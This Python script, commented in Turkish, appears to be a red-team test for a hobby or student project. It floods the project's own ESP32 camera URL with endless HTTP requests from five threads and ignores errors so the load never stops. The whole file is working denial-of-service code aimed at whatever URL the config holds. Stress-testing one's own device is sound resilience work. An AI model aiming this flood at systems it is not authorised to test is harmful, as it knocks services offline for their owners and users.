import urllib.request
import threading
import time
from config.settings import Config

# Hedef: Projemizdeki ESP32 veya Ana Bilgisayar
HEDEF_URL = Config.ESP32_CAMERA_URL

def sahte_saldiri(thread_id):
    """Hedefe sürekli sahte HTTP istekleri atarak onu meşgul eder (HTTP Flood / DoS Simülasyonu)"""
    istek_sayisi = 0
    while True:
        try:
            # 1 saniyelik çok kısa bir timeout ile hedefe yüklen
            urllib.request.urlopen(HEDEF_URL, timeout=1.0)
            istek_sayisi += 1
            if istek_sayisi % 10 == 0:
                print(f"[Thread-{thread_id}] {istek_sayisi} paket gönderildi...")
        except Exception:
            # Hata alsa bile durmadan saldırmaya devam et
            pass

if __name__ == "__main__":
    print(f"!!! KIRMIZI TAKIM DEVREDE !!!")
    print(f"Hedef URL: {HEDEF_URL}")
    print("Saldırı 3 saniye içinde başlıyor... Durdurmak için CTRL+C yapın.")
    time.sleep(3)
    
    # 5 farklı koldan aynı anda saldırı başlatıyoruz (Multithreading)
    for i in range(5):
        t = threading.Thread(target=sahte_saldiri, args=(i,), daemon=True)
        t.start()
        
    # Programın kapanmaması için sonsuz döngü
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nSaldırı sonlandırıldı.")